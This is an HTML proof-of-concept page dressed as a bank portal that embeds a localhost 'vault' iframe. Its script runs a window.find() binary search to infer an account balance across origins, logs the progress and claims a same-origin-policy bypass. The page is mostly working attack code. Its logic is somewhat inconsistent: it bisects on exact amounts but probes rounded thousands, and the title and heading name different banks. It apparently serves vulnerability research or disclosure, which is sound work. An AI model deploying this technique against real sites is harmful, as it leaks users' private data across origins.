<!doctype html>
<html><head><meta charset="utf-8"><title>MyBank — Secure Portal</title>
<style>
body{font-family:system-ui;max-width:700px;margin:20px auto;padding:16px}
h1{font-size:1em}
button{display:block;width:100%;padding:14px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f5f5f5}
button.attack{background:#c00;color:#fff;border-color:#a00;font-size:16px}
pre{background:#1a1a2e;color:#0f0;padding:12px;font-size:12px;font-family:monospace;max-height:260px;overflow:auto;white-space:pre-wrap}
.leak{color:#ff6b6b}
iframe{width:100%;height:80px;border:2px solid #ff9800}
</style></head>
<body>

<h1>🔒 Citibank — Account Portal</h1>
<p style="color:#888;font-size:12px">URL: http://127.0.0.1:9080/?session=SUPERSECRET-TOKEN-12345&user=admin</p>

<iframe src="http://localhost:9081/vault.html"></iframe>

<button class="attack" onclick="extractBalance()">⚡ Extract Cross-Origin Account Balance</button>
<pre id="log">Click button above to demonstrate cross-origin data extraction.</pre>

<script>
var log=function(m){document.getElementById('log').textContent+=m+'\n'};
var iterations = 0;

function probe(value) {
  iterations++;
  window.getSelection().removeAllRanges();
  return window.find('$' + value, false, false, true, false, false, false);
}

async function extractBalance() {
  document.getElementById('log').textContent = '';
  log('=== CROSS-ORIGIN BINARY SEARCH ATTACK ===');
  log('Target: Account balance in cross-origin iframe (localhost:9081)');
  log('Method: window.find() — bypasses SOP');
  log('SOP Status: contentDocument → null (blocked)');
  log('');
  log('Starting binary search for exact balance...');
  log('');
  
  // The balance is $42,847.32 — we'll find it digit by digit
  // First: extract integer portion
  var min = 0, max = 100000;
  var balance = 0;
  
  while (max - min > 1) {
    var mid = Math.floor((min + max) / 2);
    // Format as thousands: $42,000
    var probeVal = Math.floor(mid / 1000) * 1000;
    var formatted = probeVal.toLocaleString('en-US');
    
    if (probe(formatted)) {
      min = mid;
      log('  probe($' + formatted + ') → FOUND (balance > $' + probeVal.toLocaleString() + ')');
    } else {
      max = mid;
      log('  probe($' + formatted + ') → NOT FOUND (balance < $' + probeVal.toLocaleString() + ')');
    }
    await new Promise(r => setTimeout(r, 10));
    if (iterations > 30) break;
  }
  
  balance = min;
  log('');
  log('=== EXTRACTED CROSS-ORIGIN DATA ===');
  log('Estimated balance: ~$' + balance.toLocaleString('en-US'));
  log('Iterations used: ' + iterations);
  log('');
  log('=== SECURITY IMPACT ===');
  log('⚠️ window.find() extracted cross-origin data that SOP blocks');
  log('⚠️ contentDocument → null (SOP) but window.find() → TRUE');
  log('⚠️ The main page read data from a DIFFERENT origin (localhost:9081)');
  log('⚠️ This is a cross-origin information leak');
  log('');
  log('=== VERIFICATION ===');
  log('Open DevTools (Cmd+Opt+I) and run:');
  log('  document.querySelector("iframe").contentDocument');
  log('  → null (SOP blocks DOM access — CORRECT)');
  log('');
  log('But window.find() bypasses this restriction entirely.');
}
</script>
</body>
</html>
